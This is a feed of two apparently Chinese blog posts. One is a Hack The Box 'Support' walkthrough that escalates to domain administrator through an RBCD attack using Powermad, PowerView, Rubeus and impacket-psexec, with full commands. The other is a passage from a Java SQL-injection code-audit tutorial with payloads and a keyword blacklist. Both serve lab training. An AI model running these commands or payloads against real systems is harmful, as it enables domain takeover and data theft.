class="hljs-string">b&quot;armando&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc_passwd)):<br>    result += <span class="hljs-built_in">chr</span>(enc_passwd[i] ^ key[i % <span class="hljs-built_in">len</span>(key)] ^ <span class="hljs-number">223</span>)<br>    <br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>解出来一串字符串，应该就是密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">nvEfEK16</span>^<span class="hljs-number">1</span>a<span class="hljs-name">M4</span>$e<span class="hljs-number">7</span>AclUf<span class="hljs-number">8</span>x$tRWxPW<span class="hljs-meta">O1</span><span class="hljs-meta">%</span>lmz<br></code></pre></td></tr></table></figure><h1 id="ldapsearch-扫描查找信息"><a href="#ldapsearch-扫描查找信息" class="headerlink" title="ldapsearch 扫描查找信息"></a>ldapsearch 扫描查找信息</h1><p>那接下来就该看 LDAP 的信息了，389 端口运行了 LDAP 服务，我们已经知道了密码，那么用 <code>ldapsearch</code> 来查询相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldapsearch -x -H ldap://10.10.11.174:389 -D ldap@support.htb -w <span class="hljs-string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="hljs-string">&quot;dc=support,dc=htb&quot;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/722b1b2ef9c68dce.png" alt="image-20250419032724205" style="zoom: 50%;" /><p>浏览信息览发现了 <code>support</code> 用户的 <code>info</code> 字段</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">info:</span> Ironside47pleasure40Watchful<br></code></pre></td></tr></table></figure><p>其他的用户 info 字段都是空的，所以这看起来就很可疑，可能是密码之类的</p><p>当成密码用 Evil-winrm 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.10.11.174 -u <span class="hljs-string">&quot;support&quot;</span> -p <span class="hljs-string">&#x27;Ironside47pleasure40Watchful&#x27;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/60cc0940fa5d8cf7.png" alt="image-20250419033847918" style="zoom: 40%;" /><p>拿到 flag</p><h1 id="对域进行信息收集"><a href="#对域进行信息收集" class="headerlink" title="对域进行信息收集"></a>对域进行信息收集</h1><p>使用 <code>Get-ADDomain</code> 查看域信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\support\Desktop&gt; <span class="hljs-built_in">Get-ADDomain</span><br><br><br>AllowedDNSSuffixes                 : &#123;&#125;<br>ChildDomains                       : &#123;&#125;<br>ComputersContainer                 : CN=Computers,DC=support,DC=htb<br>DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb<br>DistinguishedName                  : DC=support,DC=htb<br>DNSRoot                            : support.htb<br>DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb<br>DomainMode                         : Windows2016Domain<br>DomainSID                          : S<span class="hljs-literal">-1-5-21-1677581083-3380853377-188903654</span><br>ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb<br>Forest                             : support.htb<br>InfrastructureMaster               : dc.support.htb<br>LastLogonReplicationInterval       :<br>LinkedGroupPolicyObjects           : &#123;CN=&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=support,DC=htb&#125;<br>LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb<br>ManagedBy                          :<br>Name                               : support<br>NetBIOSName                        : SUPPORT<br>ObjectClass                        : domainDNS<br>ObjectGUID                         : <span class="hljs-number">553</span>cd9a3<span class="hljs-literal">-86c4-4d64-9e85-5146a98c868e</span><br>ParentDomain                       :<br>PDCEmulator                        : dc.support.htb<br>PublicKeyRequiredPasswordRolling   : True<br>QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb<br>ReadOnlyReplicaDirectoryServers    : &#123;&#125;<br>ReplicaDirectoryServers            : &#123;dc.support.htb&#125;<br>RIDMaster                          : dc.support.htb<br>SubordinateReferences              : &#123;DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb&#125;<br>SystemsContainer                   : CN=System,DC=support,DC=htb<br>UsersContainer                     : CN=Users,DC=support,DC=htb<br></code></pre></td></tr></table></figure><p>从中可以发现这台机器是域 <code>support.htb</code> 的域控制器，把它加入本地 host</p><p>通过 <code>whoami</code> 查看所属用户组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /groups<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/f48da92422fba439.png" alt="image-20250419035926121" style="zoom: 40%;" /><h2 id="上传-SharpHound-枚举-AD-信息"><a href="#上传-SharpHound-枚举-AD-信息" class="headerlink" title="上传 SharpHound 枚举 AD 信息"></a>上传 SharpHound 枚举 AD 信息</h2><p>开放了 88 端口，上传 SharpHound 进行域内的信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\SharpHound.exe <span class="hljs-literal">--CollectionMethods</span> All <span class="hljs-literal">--Domain</span> support.htb <span class="hljs-literal">--ExcludeDCs</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/13259487ac5d6922.png" alt="image-20250420221631033" style="zoom: 40%;" /><p>将文件下载到本地</p><img src="https://img.dkdun.cn/v1/2025/12/6fdccbe631e4289a.png" alt="image-20250420222112263" style="zoom: 50%;" /><h2 id="开启-Neo4j-图形数据库"><a href="#开启-Neo4j-图形数据库" class="headerlink" title="开启 Neo4j 图形数据库"></a>开启 Neo4j 图形数据库</h2><img src="https://img.dkdun.cn/v1/2025/12/539c7ddf3af6d7a4.png" alt="image-20250420232256130" style="zoom: 45%;" /><p>开启 Neo4j 然后访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:7474/browser<br></code></pre></td></tr></table></figure><p>进去之后修改密码</p><h2 id="BloodHound-查看域内关系"><a href="#BloodHound-查看域内关系" class="headerlink" title="BloodHound 查看域内关系"></a>BloodHound 查看域内关系</h2><p>打开 <code>BloodHound</code> 用 Neo4j 的用户名和密码登陆进去</p><img src="https://img.dkdun.cn/v1/2025/12/ee4e6da286eb02f6.png" alt="image-20250420232046478" style="zoom:50%;" /><p>将下载的有关 AD 域信息的压缩包导入，直接拖进去就行了</p><img src="https://img.dkdun.cn/v1/2025/12/e1d8f9e4a87c73dc.png" alt="image-20250420232512337" style="zoom: 35%;" /><p>查找 <code>SUPPORT@SUPPORT.HTB</code> 用户，在 <code>Node Info</code> 的 <code>Group Delegated Object Control</code> 中发现 <code>GenericAll</code> 权限也就是完全控制权限，可以发现 <code>SUPPORT@SUPPORT.HTB</code> 属于 <code>SHARED SUPPORT ACCOUNTS</code> 组，该组对整个 DC 有完全控制权限</p><img src="https://img.dkdun.cn/v1/2025/12/a0271ede03b1ed09.png" alt="image-20250420234318895" style="zoom: 40%;" /><p>右键 <code>GenericAll</code> 查看 help 的建议</p><img src="https://img.dkdun.cn/v1/2025/12/0bb2f18b5086ff3c.png" alt="image-20250420235056409" style="zoom: 67%;" /><p>“Full control of a computer object can be used to perform a resource based constrained delegation attack.”</p><p>对计算机对象的完全控制可用于执行基于资源的约束委派攻击</p><img src="https://img.dkdun.cn/v1/2025/12/4b173c5e9ea0761a.png" alt="image-20250420235357614" style="zoom:67%;" /><h1 id="基于-kerberos-的-RBCD-攻击"><a href="#基于-kerberos-的-RBCD-攻击" class="headerlink" title="基于 kerberos 的 RBCD 攻击"></a>基于 kerberos 的 RBCD 攻击</h1><p>RBCD 把设置委派的权限赋予了机器自身，即机器自己可以决定谁可以被委派来控制，也就是说机器自身可以直接在自己账户上配置 <code>msds-allowedtoactonbehalfofotheridentity</code> 属性来设置 RBCD，所以可以使用 Powermad 来添加新的攻击者控制的计算机帐户</p><p>攻击步骤：</p><ul><li><p>用 Powermad 添加一个新的攻击者控制的计算机账户</p></li><li><p>用 PowerView 来获取新创建的计算机帐户的安全标识符 (SID)</p></li><li><p>以新建的计算机账户的 SID 为委托建立一个通用 ACE，并获取新 DACL&#x2F;ACE</p></li><li><p>将 ACE 设置到目标计算机账户的委派属性中，将 <code>$SDBytes</code> 写入目标计算机账户的 <code>msds-allowedtoactonbehalfofotheridentity</code> 字段中</p></li><li><p>使用 Rubeus 生成 hash 获取 TGT票据</p></li><li><p>用带有 Kerberos 身份验证的 psexec 获取 SYSTEM shell</p></li></ul><p>根据建议信息需要 PowerView、Powermad 和 Rubeus 三个工具，把这几个工具传上去</p><img src="https://img.dkdun.cn/v1/2025/12/21a57bb5f33cfef2.png" alt="image-20250421003832988" style="zoom: 80%;" /><h2 id="利用-Powermad-创建新用户"><a href="#利用-Powermad-创建新用户" class="headerlink" title="利用 Powermad 创建新用户"></a>利用 Powermad 创建新用户</h2><p>导入 <code>powermad.ps1</code> 模块，然后创建一个 <code>butt3rf1y</code> 用户，密码为 <code>123456</code>，添加之后再进行验证</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">import-module</span> .\powermad.ps1<br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> butt3rf1y <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-identity</span> butt3rf1y<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1e9e0edd1ffbaeb8.png" alt="image-20250421004439909" style="zoom: 40%;" /><h2 id="写入-msds-allowedtoactonbehalfofotheridentity-字段"><a href="#写入-msds-allowedtoactonbehalfofotheridentity-字段" class="headerlink" title="写入 msds-allowedtoactonbehalfofotheridentity 字段"></a>写入 msds-allowedtoactonbehalfofotheridentity 字段</h2><p>导入 <code>powerview.ps1</code> 模块</p><p>获取新建计算机账户的 SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ComputerSid</span> = <span class="hljs-built_in">Get-DomainComputer</span> butt3rf1y <span class="hljs-literal">-Properties</span> objectsid | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-Expand</span> objectsid<br></code></pre></td></tr></table></figure><p>创建 SD，正确的 SDDL（Security Descriptor Definition Language，安全描述符定义语言)）字符串基本结构如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:&lt;OwnerSid&gt;G:&lt;GroupSid&gt;D:&lt;DACL&gt;S:&lt;SACL&gt;<br></code></pre></td></tr></table></figure><p>所以我们构造出来的字符串如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:BAD:(A;;GA;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$ComputerSid</span>))<br></code></pre></td></tr></table></figure><p>最终结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$ComputerSid</span>))<br></code></pre></td></tr></table></figure><p>权限设置参考：<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings">SID Strings</a> 和 <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings">ACE Strings</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">CC | DC | LC | SW | <span class="hljs-built_in">RP</span> | WP | DT | LO | CR | SD | RC | WD | WO<br></code></pre></td></tr></table></figure><p>将 <code>$SDBytes</code> 写入目标计算机账户的 <code>msds-allowedtoactonbehalfofotheridentity</code> 字段中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>,<span class="hljs-number">0</span>)<br>// 将 <span class="hljs-variable">$SD</span> 的二进制数据写入 <span class="hljs-variable">$SDBytes</span> 数组中<br><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-variable">$TargetComputer</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125;<br>// 将 <span class="hljs-variable">$SDBytes</span> 写入目标计算机账户的 msds<span class="hljs-literal">-allowedtoactonbehalfofotheridentity</span> 字段中<br><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-variable">$targetComputer</span> <span class="hljs-literal">-Properties</span> <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span><br>// 验证是否成功修改<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/35aeb1145bbc481e.png" alt="image-20250421212911714" style="zoom: 50%;" /><h2 id="Rubeus-进行-s4u-攻击获取服务票据"><a href="#Rubeus-进行-s4u-攻击获取服务票据" class="headerlink" title="Rubeus 进行 s4u 攻击获取服务票据"></a>Rubeus 进行 s4u 攻击获取服务票据</h2><p>生成 <code>rc4_hmac</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\Rubeus.exe hash /password:<span class="hljs-number">123456</span> /user:butt3rf1y<span class="hljs-variable">$</span> /domain:support.htb<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/291744efdcd58ce8.png" alt="image-20250421220505217" style="zoom: 70%;" /><p>取 <code>rc4_hmac</code> 值</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">32</span>ED87BDB5FDC5E9CBA885<span class="hljs-number">47376818D4</span><br></code></pre></td></tr></table></figure><p>生成 TGT 票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\Rubeus.exe s4u /user:butt3rf1y<span class="hljs-variable">$</span> /rc4:<span class="hljs-number">32</span>ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/3f4b23cc12fff0f3.png" alt="image-20250421232725353" style="zoom: 80%;" /><h2 id="利用-psexec-获取-system-shell"><a href="#利用-psexec-获取-system-shell" class="headerlink" title="利用 psexec 获取 system shell"></a>利用 psexec 获取 system shell</h2><p>将最后的 <code>administrator</code> 的复制出来新建文件 <code>TGT.b64</code>，先转为 <code>.kirbi</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;[:space:]&#x27;</span> &lt; TGT.b64 | <span class="hljs-built_in">base64</span> -d &gt; TGT.kirbi<br></code></pre></td></tr></table></figure><p>再转为 <code>.ccache</code> 文件（Kerberos 凭据缓存文件）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ticketConverter.py TGT.kirbi TGT.ccache<br></code></pre></td></tr></table></figure><p>更新 <code>KRB5CCNAME</code> 环境变量，指定 Kerberos 票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=TGT.ccache<br></code></pre></td></tr></table></figure><p>用带有 Kerberos 身份验证的 psexec 获取 SYSTEM shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-psexec support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174 -k -no-pass<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1fca07554820f917.png" alt="image-20250421233723004" style="zoom:70%;" />]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello-Java-Sec:SQLI</title>
    <link href="/2025/04/18/Hello-Java-Sec-SQLI/"/>
    <url>/2025/04/18/Hello-Java-Sec-SQLI/</url>
    
    <content type="html"><![CDATA[<p>从零开始的 Java 代码审计，项目地址：Hello-Java-Sec：<a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a></p><span id="more"></span><h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><h2 id="Statement-注入"><a href="#Statement-注入" class="headerlink" title="Statement 注入"></a>Statement 注入</h2><p><code>Statement</code> 主要用于执行普通的 SQL语句</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">vul1</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br><br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br><br>            log.info(<span class="hljs-string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>            <br>            ...<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>首先创建了一个 <code>StringBuilder</code> 对象 <code>result</code>，构造了一个 sql 查询语句，加载 JDBC 驱动，创建了 <code>Statement</code> 对象执行了 SQL 语句</p><p>但是 SQL 语句直接将用户输入拼接到语句中并没有进行过滤之类的操作，导致了注入产生</p><p><img src="https://img.dkdun.cn/v1/2025/12/3ac9cfbd75c608be.png"></p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--%20+</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9591581fa6930381.png"></p><p>sql 语句变成了这样，与前面的单引号直接闭合了形成一个完整的查询语句去修改 XML 数据，利用报错将当前数据库用户通过拼接字符串显示出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--%20+ &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="黑名单-大小写强制转换过滤"><a href="#黑名单-大小写强制转换过滤" class="headerlink" title="黑名单+大小写强制转换过滤"></a>黑名单+大小写强制转换过滤</h3><p>通过黑名单过滤来预防注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkSql</span><span class="hljs-params">(String content)</span> &#123;<br>    String[] black_list = &#123;<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;--&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;and&quot;</span>, <span class="hljs-string">&quot;or&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;insert&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;delete&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;count&quot;</span>, <span class="hljs-string">&quot;drop&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;mid&quot;</span>, <span class="hljs-string">&quot;master&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;char&quot;</span>, <span class="hljs-string">&quot;declare&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>&#125;;<br>    <span class="hljs-keyword">for</span> (String s : black_list) &#123;<br>        <span class="hljs-keyword">if</span> (content.toLowerCase().contains(s)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PrepareStatement"><a href="#PrepareStatement" class="headerlink" title="PrepareStatement"></a>PrepareStatement</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">vul2</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br><br>            log.info(<span class="hljs-string">&quot;[vul] 执行SQL语句： &#123;&#125;&quot;</span>, sql);<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br>            ...<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>虽然采用了 <code>prepareStatement</code> 方法进行了预编译，但并没有使用 <code>?</code> 进行占位，所以本质上还是 sql 进行了语句拼接，产生了 sql 注入</p><p><img src="https://img.dkdun.cn/v1/2025/12/2074b96e7dde0a4a.png"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2077a05b14921065.png"></p><p>sql 语句变成了这样，直接查询 id &#x3D;2 的结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="使用-占位"><a href="#使用-占位" class="headerlink" title="使用 ? 占位"></a>使用 ? 占位</h3><p>用 <code>?</code> 占位处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe1</span><span class="hljs-params">(String id)</span> &#123;<br>    Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = ?&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>    st.setString(<span class="hljs-number">1</span>, id);<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b005b26d18d18dbf.png"></p><p>已经查询不到全部数据了</p><h2 id="JdbcTemplate"><a href="#JdbcTemplate" class="headerlink" title="JdbcTemplate"></a>JdbcTemplate</h2><p>JdbcTemplate 是 Spring 